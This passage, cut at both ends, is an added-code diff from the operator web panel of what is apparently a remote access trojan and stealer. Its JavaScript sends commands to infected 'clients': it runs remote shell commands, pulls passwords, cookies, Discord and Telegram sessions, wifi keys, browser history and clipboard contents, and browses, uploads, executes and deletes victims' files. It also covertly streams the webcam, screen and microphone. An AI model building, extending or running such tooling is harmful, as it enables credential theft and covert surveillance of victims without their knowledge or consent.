+                    <span class="text-white font-mono bg-white/5 px-2 rounded">${geo.query || geo.Query || 'N/A'}</span>
+                </div>
+                <div class="flex justify-between text-xs border-b border-white/5 py-2">
+                    <span class="text-zinc-500">Location</span> 
+                    <span class="text-zinc-300 flex items-center gap-2">
+                        <span class="country-flag">${flag}</span> 
+                        ${geo.city || geo.City || 'Unknown'}, ${geo.country || geo.Country || 'Unknown'}
+                    </span>
+                </div>
+                <div class="flex justify-between text-xs py-2">
+                    <span class="text-zinc-500">Country Code</span> 
+                    <span class="text-zinc-300 font-mono">${countryCode}</span>
+                </div>
+            `;
+            
+            const sysHtml = `
+                <div class="flex justify-between text-xs border-b border-white/5 pb-2">
+                    <span class="text-zinc-500">OS</span> 
+                    <span class="text-theme font-bold">${c.info.os || c.info.OS || 'Unknown'}</span>
+                </div>
+                <div class="flex justify-between text-xs border-b border-white/5 py-2">
+                    <span class="text-zinc-500">User</span> 
+                    <span class="text-zinc-300">${c.info.user || c.info.User || 'Unknown'}</span>
+                </div>
+                <div class="flex justify-between text-xs border-b border-white/5 py-2">
+                    <span class="text-zinc-500">Hostname</span> 
+                    <span class="text-zinc-300">${c.info.hostname || c.info.Hostname || 'Unknown'}</span>
+                </div>
+                <div class="flex justify-between text-xs border-b border-white/5 py-2">
+                    <span class="text-zinc-500">Architecture</span> 
+                    <span class="text-zinc-300 font-mono text-[10px]">${c.info.arch || c.info.Arch || 'Unknown'}</span>
+                </div>
+                <div class="flex justify-between text-xs py-2">
+                    <span class="text-zinc-500">Processor</span> 
+                    <span class="text-zinc-300 text-[10px]">${c.info.processor || c.info.Processor || 'Unknown'}</span>
+                </div>
+            `;
+            
+            console.log('[INFO] Setting geoInfo HTML...');
+            document.getElementById('geoInfo').innerHTML = geoHtml;
+            console.log('[INFO] Setting sysInfo HTML...');
+            document.getElementById('sysInfo').innerHTML = sysHtml;
+            
+            console.log('[INFO] ✅✅✅ Info updated successfully!');
+            console.log('[INFO] ========================================');
+        }
+
+        function runCmd() {
+            const i = document.getElementById('cmdInput');
+            if(selectedClientId && i.value) {
+                socket.emit('execute_command', {target_client: selectedClientId, command: i.value});
+                document.getElementById('termOutput').innerHTML += `<div class="mt-1"><span class="text-theme">➜</span> <span class="text-white">${i.value}</span></div>`;
+                i.value = '';
+            }
+        }
+        socket.on('result_data', d => {
+            if(d.client_id === selectedClientId) {
+                const term = document.getElementById('termOutput');
+                term.innerHTML += `<div class="text-zinc-400 mb-2 pl-4 border-l border-white/10">${d.output}</div>`;
+                term.scrollTop = term.scrollHeight;
+            }
+        });
+
+        // Stealer
+        function runStealer(type) {
+            if(selectedClientId) {
+                document.getElementById('stealerOutput').value = `[SYSTEM] Initializing ${type.toUpperCase()} extraction...\n`;
+                
+                // Map stealer types to socket events
+                const stealerMap = {
+                    'passwords': 'grab_passwords',
+                    'discord': 'grab_discord',
+                    'telegram': 'grab_telegram',
+                    'wifi': 'grab_wifi',
+                    'history': 'grab_history',
+                    'cookies': 'grab_cookies',
+                    'clipboard': 'grab_clipboard',
+                    'system': 'grab_system_info',
+                    'all': 'grab_all'
+                };
+                
+                const eventName = stealerMap[type];
+                if(eventName) {
+                    socket.emit(eventName, {target_client: selectedClientId});
+                } else {
+                    // Fallback for old stealer system
+                    socket.emit('run_stealer', {target_client: selectedClientId, type: type});
+                }
+            }
+        }
+        
+        // Handle stealer results
+        socket.on('stealer_data', d => {
+            if(d.client_id === selectedClientId) {
+                const out = document.getElementById('stealerOutput');
+                // Добавляем данные вместо замены для частей и clipboard
+                if (d.data.includes('[PART') || 
+                    d.data.includes('[PASSWORDS PART') || 
+                    d.data.includes('[COOKIES PART') || 
+                    d.data.includes('[HISTORY PART') || 
+                    d.data.includes('[CLIPBOARD PART') || 
+                    d.data.includes('[SYSTEM INFO') ||
+                    d.data.includes('📋 CLIPBOARD CONTENT')) {
+                    // Если это часть данных или clipboard, добавляем к существующему
+                    if (out.value && !out.value.endsWith('\n')) {
+                        out.value += '\n';
+                    }
+                    out.value += d.data;
+                } else {
+                    // Если это новая команда, заменяем
+                    out.value = d.data;
+                }
+                out.scrollTop = out.scrollHeight;
+            }
+        });
+        
+        // Handle command results (for new grabber commands)
+        socket.on('command_result', d => {
+            if(d.client_id === selectedClientId) {
+                const out = document.getElementById('stealerOutput');
+                out.value += d.output + '\n';
+                out.scrollTop = out.scrollHeight;
+            }
+        });
+
+        function requestFiles(path) { 
+            if(!selectedClientId) return;
+            
+            if(path === '..') {
+                const parts = currentPath.split(/[/\\]/).filter(p => p && p !== '.');
+                parts.pop();
+                path = parts.length > 0 ? parts.join('/') : '.';
+            } else if(path && !path.startsWith('/') && !path.match(/^[A-Z]:/i)) {
+            }
+            
+            console.log('[FILES] Requesting path:', path);
+            socket.emit('fs_list_request', {target_client: selectedClientId, path: path});
+        }
+        
+        socket.on('fs_view_data', d => {
+            console.log('[FILES] RAW DATA:', JSON.stringify(d));
+            
+            if(d.client_id !== selectedClientId) {
+                console.log('[FILES] Ignoring - wrong client');
+                return;
+            }
+            
+            currentPath = d.path;
+            document.getElementById('filePath').value = currentPath;
+            const list = document.getElementById('fileList');
+            list.innerHTML = '';
+            
+            console.log('[FILES] Received files for path:', currentPath);
+            console.log('[FILES] Items count:', d.items ? d.items.length : 0);
+            console.log('[FILES] Items:', d.items);
+            
+            if(!d.items || !Array.isArray(d.items)) {
+                console.error('[FILES] Invalid items data:', d.items);
+                list.innerHTML = `<div class="text-center py-8 text-red-500 text-xs">Error: Invalid data received</div>`;
+                return;
+            }
+            
+            if(currentPath !== '/' && currentPath !== '.' && currentPath !== '') {
+                 list.innerHTML += `
+                    <div onclick="requestFiles('..')" class="grid grid-cols-12 px-2 py-2 hover:bg-white/5 rounded cursor-pointer text-zinc-500 border-b border-white/[0.02]">
+                        <div class="col-span-12 flex items-center gap-2">
+                            <i class="fas fa-level-up-alt"></i> 
+                            <span class="text-xs">Parent Directory</span>
+                        </div>
+                    </div>`;
+            }
+
+            d.items.forEach((f, index) => {
+                console.log(`[FILES] Processing item ${index}:`, f);
+                
+                const isDir = f.type === 'dir';
+                const icon = isDir ? '<i class="fas fa-folder text-yellow-500/80 mr-2"></i>' : '<i class="fas fa-file-code text-blue-400/80 mr-2"></i>';
+                const size = f.size ? formatFileSize(f.size) : '';
+                const safeName = f.name.replace(/'/g, "\\'").replace(/\\/g, '\\\\');
+                
+                const separator = currentPath.includes('\\') ? '\\' : '/';
+                const fullPath = currentPath === '.' ? f.name : `${currentPath}${separator}${f.name}`;
+                const safeFullPath = fullPath.replace(/'/g, "\\'").replace(/\\/g, '\\\\');
+                
+                console.log(`[FILES] Item ${index} - Name: ${f.name}, Type: ${f.type}, FullPath: ${fullPath}`);
+                
+                const click = isDir ? `requestFiles('${safeFullPath}')` : '';
+                const dlBtn = `<button onclick="event.stopPropagation(); dlFile('${safeName}', ${isDir})" class="text-zinc-500 hover:text-theme transition mr-2" title="${isDir ? 'Download as ZIP' : 'Download'}"><i class="fas fa-download"></i></button>`;
+                const execBtn = !isDir ? `<button onclick="event.stopPropagation(); executeFile('${safeName}')" class="text-zinc-500 hover:text-green-500 transition mr-2" title="Execute"><i class="fas fa-play"></i></button>` : '';
+                const delBtn = `<button onclick="event.stopPropagation(); deleteFile('${safeName}', ${isDir})" class="text-zinc-500 hover:text-red-500 transition" title="Delete"><i class="fas fa-trash"></i></button>`;
+                
+                list.innerHTML += `
+                    <div class="grid grid-cols-12 px-2 py-2 hover:bg-white/5 rounded text-xs items-center group border-b border-white/[0.02]">
+                        <div class="col-span-7 flex items-center ${isDir ? 'cursor-pointer' : ''} select-none text-zinc-300 group-hover:text-white truncate" ${isDir ? `onclick="${click}"` : ''}>${icon} ${f.name}</div>
+                        <div class="col-span-2 text-right text-zinc-600 font-mono text-[10px]">${size}</div>
+                        <div class="col-span-3 text-right opacity-0 group-hover:opacity-100 transition flex justify-end gap-1">${dlBtn}${execBtn}${delBtn}</div>
+                    </div>`;
+            });
+            
+            console.log('[FILES] Total items rendered:', d.items.length);
+            
+            if(d.items.length === 0) {
+                list.innerHTML += `<div class="text-center py-8 text-zinc-600 text-xs italic">Empty directory</div>`;
+            }
+        });
+        
+        function formatFileSize(bytes) {
+            if(!bytes || bytes === 0) return '';
+            const sizes = ['B', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(1024));
+            return Math.round(bytes / Math.pow(1024, i) * 100) / 100 + ' ' + sizes[i];
+        }
+        
+        let downloadInProgress = false;
+        
+        function dlFile(name, isDir = false) {
+            if(downloadInProgress) {
+                console.log('[FILES] Download already in progress');
+                return;
+            }
+            
+            const separator = currentPath.includes('\\') ? '\\' : '/';
+            const fullPath = currentPath === '.' ? name : `${currentPath}${separator}${name}`;
+            
+            console.log(`[FILES] Downloading ${isDir ? 'folder as ZIP' : 'file'}:`, fullPath);
+            
+            downloadInProgress = true;
+            
+            document.body.style.cursor = 'wait';
+            
+            socket.emit('fs_download_request', {
+                target_client: selectedClientId, 
+                filename: fullPath,
+                is_dir: isDir
+            });
+        }
+        
+        function deleteFile(name, isDir) {
+            const type = isDir ? 'folder' : 'file';
+            if(!confirm(`Delete this ${type}?\n${name}`)) return;
+            
+            const separator = currentPath.includes('\\') ? '\\' : '/';
+            const fullPath = currentPath === '.' ? name : `${currentPath}${separator}${name}`;
+            console.log('[FILES] Deleting:', fullPath);
+            socket.emit('fs_delete_request', {target_client: selectedClientId, filename: fullPath, is_dir: isDir});
+        }
+        
+        function executeFile(name) {
+            if(!confirm(`Execute this file?\n${name}`)) return;
+            
+            const separator = currentPath.includes('\\') ? '\\' : '/';
+            const fullPath = currentPath === '.' ? name : `${currentPath}${separator}${name}`;
+            console.log('[FILES] Executing:', fullPath);
+            socket.emit('fs_execute_request', {target_client: selectedClientId, filename: fullPath});
+        }
+        
+        socket.on('fs_download_ready', d => {
+            if(d.client_id !== selectedClientId) return;
+            
+            document.body.style.cursor = 'default';
+            downloadInProgress = false;
+            
+            console.log('[FILES] Download ready:', d.filename);
+            
+            try {
+                const binaryString = atob(d.data);
+                const bytes = new Uint8Array(binaryString.length);
+                for (let i = 0; i < binaryString.length; i++) {
+                    bytes[i] = binaryString.charCodeAt(i);
+                }
+                
+                const blob = new Blob([bytes], { type: 'application/octet-stream' });
+                const url = URL.createObjectURL(blob);
+                
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = d.filename.split(/[\\/]/).pop();
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                
+                setTimeout(() => URL.revokeObjectURL(url), 100);
+                
+                console.log('[FILES] Download completed');
+            } catch(e) {
+                console.error('[FILES] Download error:', e);
+                alert('Download failed: ' + e.message);
+            }
+        });
+        
+        socket.on('fs_operation_result', d => {
+            if(d.client_id !== selectedClientId) return;
+            
+            document.body.style.cursor = 'default';
+            downloadInProgress = false;
+            
+            console.log('[FILES] Operation result:', d.message);
+            
+            if(!d.success) {
+                alert(d.message);
+            }
+            
+            if(d.success) {
+                requestFiles(currentPath);
+            }
+        });
+        
+        function uploadFile(inp) {
+            if(!inp.files[0]) return;
+            const f = inp.files[0];
+            
+            if(f.size > 50 * 1024 * 1024) {
+                alert(`File too large: ${(f.size / 1024 / 1024).toFixed(1)}MB (max 50MB)`);
+                inp.value = '';
+                return;
+            }
+            
+            const r = new FileReader();
+            r.onload = e => {
+                const separator = currentPath.includes('\\') ? '\\' : '/';
+                const targetPath = currentPath === '.' ? f.name : `${currentPath}${separator}${f.name}`;
+                console.log('[FILES] Uploading to:', targetPath, `(${(f.size / 1024).toFixed(1)}KB)`);
+                
+                socket.emit('fs_upload_file', {
+                    target_client: selectedClientId, 
+                    filename: targetPath, 
+                    data: e.target.result.split(',')[1] // Только base64 без префикса
+                });
+            };
+            r.readAsDataURL(f);
+            inp.value = '';
+        }
+
+        let webcamActive = false;
+        let webcamFrameCount = 0;
+        let webcamStartTime = 0;
+        let webcamDurationInterval = null;
+        
+        function toggleWebcam() {
+            if(!selectedClientId) return;
+            
+            webcamActive = !webcamActive;
+            const btn = document.getElementById('webcamToggleBtn');
+            const statusDot = document.getElementById('camStatusDot');
+            const statusText = document.getElementById('camStatusText');
+            const statusText2 = document.getElementById('camStatusText2');
+            const placeholder = document.getElementById('camPlaceholder');
+            
+            if(webcamActive) {
+                // Get settings from UI
+                const camera = parseInt(document.getElementById('cameraSelect').value);
+                const resolution = document.getElementById('resolutionSelect').value;
+                const quality = parseInt(document.getElementById('qualitySlider').value);
+                const fps = parseInt(document.getElementById('fpsSelect').value);
+                
+                // Parse resolution
+                const [width, height] = resolution.split('x').map(Number);
+                
+                // Send settings to client
+                socket.emit('start_webcam', {
+                    target_client: selectedClientId,
+                    camera: camera,
+                    width: width,
+                    height: height,
+                    quality: quality,
+                    fps: fps
+                });
+                
+                // Reset stats
+                webcamFrameCount = 0;
+                webcamStartTime = Date.now();
+                document.getElementById('frameCount').textContent = '0';
+                document.getElementById('streamDuration').textContent = '00:00';
+                
+                // Start duration timer
+                webcamDurationInterval = setInterval(() => {
+                    const elapsed = Math.floor((Date.now() - webcamStartTime) / 1000);
+                    const minutes = Math.floor(elapsed / 60);
+                    const seconds = elapsed % 60;
+                    document.getElementById('streamDuration').textContent = 
+                        `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+                }, 1000);
+                
+                btn.innerHTML = '<i class="fas fa-stop text-[10px]"></i> STOP STREAM';
+                btn.classList.remove('from-red-600/20', 'to-red-600/10', 'hover:from-red-600/30', 'hover:to-red-600/20', 'text-red-400', 'border-red-500/30');
+                btn.classList.add('from-zinc-700/50', 'to-zinc-700/30', 'hover:from-zinc-700/60', 'hover:to-zinc-700/40', 'text-zinc-300', 'border-zinc-500/30');
+                statusDot.classList.remove('bg-zinc-600');
+                statusDot.classList.add('bg-red-500', 'animate-pulse');
+                statusText.textContent = 'Live Stream';
+                statusText2.textContent = 'Streaming';
+                placeholder.classList.add('hidden');
+            } else {
+                socket.emit('stop_webcam', {target_client: selectedClientId});
+                
+                // Stop duration timer
+                if(webcamDurationInterval) {
+                    clearInterval(webcamDurationInterval);
+                    webcamDurationInterval = null;
+                }
+                
+                btn.innerHTML = '<i class="fas fa-play text-[10px]"></i> START STREAM';
+                btn.classList.remove('from-zinc-700/50', 'to-zinc-700/30', 'hover:from-zinc-700/60', 'hover:to-zinc-700/40', 'text-zinc-300', 'border-zinc-500/30');
+                btn.classList.add('from-red-600/20', 'to-red-600/10', 'hover:from-red-600/30', 'hover:to-red-600/20', 'text-red-400', 'border-red-500/30');
+                statusDot.classList.remove('bg-red-500', 'animate-pulse');
+                statusDot.classList.add('bg-zinc-600');
+                statusText.textContent = 'Offline';
+                statusText2.textContent = 'Offline';
+                document.getElementById('camImg').src = '';
+                placeholder.classList.remove('hidden');
+            }
+        }
+        
+        function takeSnapshot() {
+            if(!webcamActive) {
+                alert('Start webcam stream first');
+                return;
+            }
+            
+            const img = document.getElementById('camImg');
+            if(!img.src) {
+                alert('No frame available');
+                return;
+            }
+            
+            // Create download link
+            const link = document.createElement('a');
+            link.href = img.src;
+            link.download = `snapshot_${selectedClientId}_${Date.now()}.jpg`;
+            link.click();
+        }
+        
+        function refreshCameraList() {
+            if(!selectedClientId) {
+                alert('Please select a client first');
+                return;
+            }
+            
+            if(webcamActive) {
+                alert('Stop webcam before refreshing camera list');
+                return;
+            }
+            
+            // Request camera list from client
+            socket.emit('get_camera_list', {target_client: selectedClientId});
+        }
+        
+        function toggleFullscreen() {
+            const container = document.getElementById('webcamContainer');
+            
+            if (!document.fullscreenElement) {
+                // Enter fullscreen
+                if (container.requestFullscreen) {
+                    container.requestFullscreen();
+                } else if (container.webkitRequestFullscreen) {
+                    container.webkitRequestFullscreen();
+                } else if (container.msRequestFullscreen) {
+                    container.msRequestFullscreen();
+                }
+            } else {
+                // Exit fullscreen
+                if (document.exitFullscreen) {
+                    document.exitFullscreen();
+                } else if (document.webkitExitFullscreen) {
+                    document.webkitExitFullscreen();
+                } else if (document.msExitFullscreen) {
+                    document.msExitFullscreen();
+                }
+            }
+        }
+        
+        // Handle fullscreen change
+        document.addEventListener('fullscreenchange', () => {
+            const container = document.getElementById('webcamContainer');
+            if (!container) return; // Exit if container doesn't exist
+            
+            const btn = container.querySelector('button[onclick="toggleFullscreen()"]');
+            if (!btn) return; // Exit if button doesn't exist
+            
+            if (document.fullscreenElement) {
+                btn.innerHTML = '<i class="fas fa-compress text-white text-[10px]"></i>';
+            } else {
+                btn.innerHTML = '<i class="fas fa-expand text-white text-[10px]"></i>';
+            }
+        });
+        
+        // Handle camera list response
+        socket.on('camera_list', d => {
+            if(d.client_id === selectedClientId) {
+                const select = document.getElementById('cameraSelect');
+                select.innerHTML = '';
+                
+                if(d.cameras && d.cameras.length > 0) {
+                    d.cameras.forEach(cam => {
+                        const option = document.createElement('option');
+                        option.value = cam.index;
+                        option.textContent = cam.name;
+                        select.appendChild(option);
+                    });
+                } else {
+                    // Fallback if no cameras found
+                    const option = document.createElement('option');
+                    option.value = '0';
+                    option.textContent = 'Camera 0 (Default)';
+                    select.appendChild(option);
+                }
+            }
+        });
+        
+        socket.on('webcam_frame', d => {
+            if(d.client_id === selectedClientId && webcamActive) {
+                document.getElementById('camImg').src = 'data:image/jpeg;base64,' + d.image;
+                // Update frame counter
+                webcamFrameCount++;
+                document.getElementById('frameCount').textContent = webcamFrameCount;
+            }
+        });
+        
+        socket.on('webcam_stopped', d => {
+            if(d.client_id === selectedClientId) {
+                webcamActive = false;
+                const btn = document.getElementById('webcamToggleBtn');
+                const statusDot = document.getElementById('camStatusDot');
+                const statusText = document.getElementById('camStatusText');
+                const statusText2 = document.getElementById('camStatusText2');
+                
+                // Stop duration timer
+                if(webcamDurationInterval) {
+                    clearInterval(webcamDurationInterval);
+                    webcamDurationInterval = null;
+                }
+                
+                btn.innerHTML = '<i class="fas fa-play text-[10px]"></i> START STREAM';
+                btn.classList.remove('from-zinc-700/50', 'to-zinc-700/30', 'hover:from-zinc-700/60', 'hover:to-zinc-700/40', 'text-zinc-300', 'border-zinc-500/30');
+                btn.classList.add('from-red-600/20', 'to-red-600/10', 'hover:from-red-600/30', 'hover:to-red-600/20', 'text-red-400', 'border-red-500/30');
+                statusDot.classList.remove('bg-red-500', 'animate-pulse');
+                statusDot.classList.add('bg-zinc-600');
+                statusText.textContent = 'Offline';
+                statusText2.textContent = 'Offline';
+                document.getElementById('camImg').src = '';
+                document.getElementById('camPlaceholder').classList.remove('hidden');
+            }
+        });
+
+        // === SCREEN CAPTURE CONTROLS ===
+        let screenFrameCount = 0;
+        let screenQuality = 40;
+        let screenFPS = 30;
+        let screenResolution = '800x600';
+        
+        function updateScreenQuality(quality) {
+            screenQuality = parseInt(quality);
+            if(selectedClientId) {
+                socket.emit('update_screen_settings', {
+                    target_client: selectedClientId,
+                    quality: screenQuality,
+                    fps: screenFPS,
+                    resolution: screenResolution
+                });
+            }
+        }
+        
+        function updateScreenFPS(fps) {
+            screenFPS = parseInt(fps);
+            if(selectedClientId) {
+                socket.emit('update_screen_settings', {
+                    target_client: selectedClientId,
+                    quality: screenQuality,
+                    fps: screenFPS,
+                    resolution: screenResolution
+                });
+            }
+        }
+        
+        function updateScreenResolution(resolution) {
+            screenResolution = resolution;
+            if(selectedClientId) {
+                socket.emit('update_screen_settings', {
+                    target_client: selectedClientId,
+                    quality: screenQuality,
+                    fps: screenFPS,
+                    resolution: screenResolution
+                });
+            }
+        }
+        
+        function takeScreenSnapshot() {
+            const img = document.getElementById('screenImg');
+            if(!img.src) {
+                alert('No screenshot available');
+                return;
+            }
+            
+            // Create download link
+            const link = document.createElement('a');
+            link.href = img.src;
+            link.download = `screen_${selectedClientId}_${Date.now()}.jpg`;
+            link.click();
+        }
+        
+        function toggleScreenFullscreen() {
+            const container = document.getElementById('screenContainer');
+            
+            if (!document.fullscreenElement) {
+                // Enter fullscreen
+                if (container.requestFullscreen) {
+                    container.requestFullscreen();
+                } else if (container.webkitRequestFullscreen) {
+                    container.webkitRequestFullscreen();
+                } else if (container.msRequestFullscreen) {
+                    container.msRequestFullscreen();
+                }
+            } else {
+                // Exit fullscreen
+                if (document.exitFullscreen) {
+                    document.exitFullscreen();
+                } else if (document.webkitExitFullscreen) {
+                    document.webkitExitFullscreen();
+                } else if (document.msExitFullscreen) {
+                    document.msExitFullscreen();
+                }
+            }
+        }
+
+        socket.on('screenshot_data', d => {
+            console.log('[SCREENSHOT] Received data for client:', d.client_id);
+            console.log('[SCREENSHOT] Selected client:', selectedClientId);
+            console.log('[SCREENSHOT] Has image data:', !!(d.image || d.data));
+            
+            if(d.client_id === selectedClientId) {
+                console.log('[SCREENSHOT] ✅ Displaying screenshot');
+                document.getElementById('screenPlaceholder').classList.add('hidden');
+                // Support both 'image' and 'data' fields for compatibility
+                const imageData = d.image || d.data;
+                document.getElementById('screenImg').src = 'data:image/jpeg;base64,' + imageData;
+                
+                // Update stats
+                screenFrameCount++;
+                document.getElementById('screenFrameCount').textContent = screenFrameCount;
+                
+                // Update last update time
+                const now = new Date();
+                const timeStr = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
+                document.getElementById('screenLastUpdate').textContent = timeStr;
+                
+                // Update status
+                document.getElementById('screenStatusText').textContent = 'Streaming';
+                document.getElementById('screenStatusText2').textContent = 'Active';
+                document.getElementById('screenStatusDot').classList.remove('bg-zinc-600');
+                document.getElementById('screenStatusDot').classList.add('bg-green-500', 'animate-pulse');
+            } else {
+                console.log('[SCREENSHOT] ⚠️ Skipping - not selected client');
+            }
+        });
+
+
+        // === MICROPHONE STREAMING ===
+        let micOn = false;
+        let audioContext = null;
+        let audioQueue = [];
+        let isPlaying = false;
+        let speakerEnabled = false;
+        let micStartTime = 0;
+        let micTimerInterval = null;
+        let audioDevices = {input: [], output: []};
+
+        function toggleSpeakerOutput(enabled) {
+            speakerEnabled = enabled;
+            if(!enabled && audioContext) {
+                audioContext.close();
+                audioContext = null;
+                audioQueue = [];
+                isPlaying = false;
+            }
+        }
+
+        // Refresh audio devices list
+        function refreshAudioDevices() {
+            if(!selectedClientId) {
+                alert('Please select a client first');
+                return;
+            }
+            
+            if(micOn) {
+                alert('Stop microphone before refreshing devices');
+                return;
+            }
+            
+            const statusEl = document.getElementById('deviceStatus');
+            statusEl.classList.remove('hidden');
+            statusEl.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Loading devices...';
+            
+            socket.emit('get_audio_devices', {target_client: selectedClientId});
+        }
+
+        function handleDeviceChange() {
+            if(micOn) {
+                toggleMic();
+                setTimeout(() => {
+                    toggleMic();
+                }, 500);
+            }
+        }
+
+        // Handle audio devices list
+        socket.on('audio_devices_list', d => {
+            if(d.client_id !== selectedClientId) return;
+            
+            audioDevices = d.devices;
+            console.log('[AUDIO] Devices received:', audioDevices);
+            
+            // Clean device name from encoding issues
+            function cleanDeviceName(name) {
+                // Remove common encoding artifacts
+                if (!name) return 'Unknown Device';
+                
+                // If name contains mostly non-ASCII, show generic name
+                const asciiCount = (name.match(/[\x20-\x7E]/g) || []).length;
+                if (asciiCount < name.length * 0.3) {
+                    return 'Audio Device';
+                }
+                
+                // Clean up the name
+                return name
+                    .replace(/[^\x20-\x7E]/g, '') // Remove non-ASCII
+                    .replace(/\s+/g, ' ')         // Normalize spaces
+                    .trim();
+            }
+            
+            // Update input devices dropdown
+            const inputSelect = document.getElementById('inputDevice');
+            inputSelect.innerHTML = '<option value="">Default Microphone</option>';
+            audioDevices.input.forEach((dev, idx) => {
+                const option = document.createElement('option');
+                option.value = dev.index;
+                const cleanName = cleanDeviceName(dev.name);
+                const rateDisplay = dev.default_rate ? `${(dev.default_rate/1000).toFixed(1)}kHz` : `${dev.sample_rate}Hz`;
+                option.textContent = `${cleanName} (${rateDisplay})`;
+                option.title = `Device ${dev.index}: ${cleanName} - Native: ${dev.default_rate || dev.sample_rate}Hz`;
+                inputSelect.appendChild(option);
+            });
+            
+            // Update output devices dropdown
+            const outputSelect = document.getElementById('outputDevice');
+            outputSelect.innerHTML = '<option value="">Disabled (Recommended)</option>';
+            audioDevices.output.forEach((dev, idx) => {
+                const option = document.createElement('option');
+                option.value = dev.index;
+                const cleanName = cleanDeviceName(dev.name);
+                const rateDisplay = dev.default_rate ? `${(dev.default_rate/1000).toFixed(1)}kHz` : `${dev.sample_rate}Hz`;
+                option.textContent = `${cleanName} (${rateDisplay})`;
+                option.title = `Device ${dev.index}: ${cleanName} - Native: ${dev.default_rate || dev.sample_rate}Hz`;
+                outputSelect.appendChild(option);
+            });
+            
+            // Update status
+            const statusEl = document.getElementById('deviceStatus');
+            statusEl.innerHTML = `<i class="fas fa-check-circle text-green-500 mr-2"></i>Found ${audioDevices.input.length} input(s) and ${audioDevices.output.length} output(s)`;
+            setTimeout(() => statusEl.classList.add('hidden'), 3000);
+        });
+
+        function toggleMic() {
+            if(!selectedClientId) {
+                alert('Please select a client first');
+                return;
+            }
+            
+            micOn = !micOn;
+            const btn = document.getElementById('micBtn');
+            const viz = document.getElementById('visualizer');
+            const status = document.getElementById('micStatus');
+            const timer = document.getElementById('micTimer');
+            
+            if(micOn) {
+                const inputDevice = document.getElementById('inputDevice').value;
+                const outputDevice = document.getElementById('outputDevice').value;
+                
+                socket.emit('start_mic', {
+                    target_client: selectedClientId, 
+                    enable: true,
+                    input_device: inputDevice ? parseInt(inputDevice) : null,
+                    output_device: outputDevice ? parseInt(outputDevice) : null
+                });
+                
+                btn.classList.add('animate-pulse', 'border-red-500', 'text-red-500');
+                viz.classList.add('recording');
+                status.innerHTML = '<i class="fas fa-circle text-red-500 animate-pulse mr-2"></i>LIVE - Streaming audio...';
+                status.classList.add('text-red-500');
+                
+                micStartTime = Date.now();
+                timer.classList.remove('hidden');
+                micTimerInterval = setInterval(() => {
+                    const elapsed = Math.floor((Date.now() - micStartTime) / 1000);
+                    const mins = Math.floor(elapsed / 60).toString().padStart(2, '0');
+                    const secs = (elapsed % 60).toString().padStart(2, '0');
+                    timer.textContent = `${mins}:${secs}`;
+                    
+                    const durationEl = document.getElementById('streamDuration');
+                    if(durationEl) {
+                        durationEl.textContent = `${mins}:${secs}`;
+                    }
+                }, 1000);
+                
+                if(speakerEnabled && !audioContext) {
+                    audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                }
+                
+                lastPacketTime = 0;
+                packetCount = 0;
+                currentStreamRate = 48000;
+                
+                const qualityEl = document.getElementById('streamQuality');
+                if(qualityEl) qualityEl.textContent = '48.0kHz Mono';
+                
+                document.getElementById('inputDevice').disabled = true;
+                document.getElementById('outputDevice').disabled = true;
+            } else {
+                socket.emit('stop_mic', {target_client: selectedClientId});
+                
+                btn.classList.remove('animate-pulse', 'border-red-500', 'text-red-500');
+                viz.classList.remove('recording');
+                status.textContent = 'Click to start listening';
+                status.classList.remove('text-red-500');
+                timer.classList.add('hidden');
+                
+                if(micTimerInterval) {
+                    clearInterval(micTimerInterval);
+                    micTimerInterval = null;
+                }
+                
+                if(audioContext) {
+                    audioContext.close();
+                    audioContext = null;
+                }
+                audioQueue = [];
+                isPlaying = false;
+                
+                const durationEl = document.getElementById('streamDuration');
+                if(durationEl) durationEl.textContent = '00:00';
+                
+                const latencyEl = document.getElementById('streamLatency');
+                if(latencyEl) latencyEl.textContent = '~200ms';
+                
+                const qualityEl = document.getElementById('streamQuality');
+                if(qualityEl) qualityEl.textContent = '48.0kHz Mono';
+                
+                currentStreamRate = 48000;
+                
+                document.getElementById('inputDevice').disabled = false;
+                document.getElementById('outputDevice').disabled = false;
+            }
+        }
+
+        // Handle streaming audio chunks
+        let lastPacketTime = 0;
+        let packetCount = 0;
+        let currentStreamRate = 48000;
+        
+        socket.on('mic_stream', d => {
+            if(d.client_id !== selectedClientId) return;
+            
+            packetCount++;
+            const now = Date.now();
+            
+            if(d.rate && d.rate !== currentStreamRate) {
+                currentStreamRate = d.rate;
+                const qualityEl = document.getElementById('streamQuality');
+                if(qualityEl) {
+                    qualityEl.textContent = `${(d.rate/1000).toFixed(1)}kHz Mono`;
+                }
+            }
+            
+            if(now - lastPacketTime > 100) {
+                const latencyEl = document.getElementById('streamLatency');
+                if(latencyEl && lastPacketTime > 0) {
+                    const latency = now - lastPacketTime;
+                    latencyEl.textContent = `~${latency}ms`;
+                }
+                lastPacketTime = now;
+            }
+            
+            if(speakerEnabled && audioContext) {
+                try {
+                    if(audioQueue.length > 50) {
+                        console.warn('[MIC] Queue overflow, clearing old buffers');
+                        audioQueue = audioQueue.slice(-10);
+                    }
+                    
+                    const binaryString = atob(d.audio);
+                    const bytes = new Uint8Array(binaryString.length);
+                    for (let i = 0; i < binaryString.length; i++) {
+                        bytes[i] = binaryString.charCodeAt(i);
+                    }
+                    
+                    const pcm16 = new Int16Array(bytes.buffer);
+                    const float32 = new Float32Array(pcm16.length);
+                    
+                    let maxAmplitude = 0;
+                    let rms = 0;
+                    for (let i = 0; i < pcm16.length; i++) {
+                        float32[i] = pcm16[i] / 32768.0;
+                        maxAmplitude = Math.max(maxAmplitude, Math.abs(float32[i]));
+                        rms += float32[i] * float32[i];
+                    }
+                    rms = Math.sqrt(rms / float32.length);
+                    
+                    let gain = 1.0;
+                    if(rms < 0.05) {
+                        gain = 3.5;
+                    } else if(rms < 0.1) {
+                        gain = 2.5;
+                    } else if(rms < 0.2) {
+                        gain = 1.8;
+                    } else if(rms < 0.3) {
+                        gain = 1.3;
+                    }
+                    
+                    for (let i = 0; i < float32.length; i++) {
+                        let sample = float32[i] * gain;
+                        if(sample > 0.95) sample = 0.95 + (sample - 0.95) * 0.3;
+                        if(sample < -0.95) sample = -0.95 + (sample + 0.95) * 0.3;
+                        float32[i] = Math.max(-1, Math.min(1, sample));
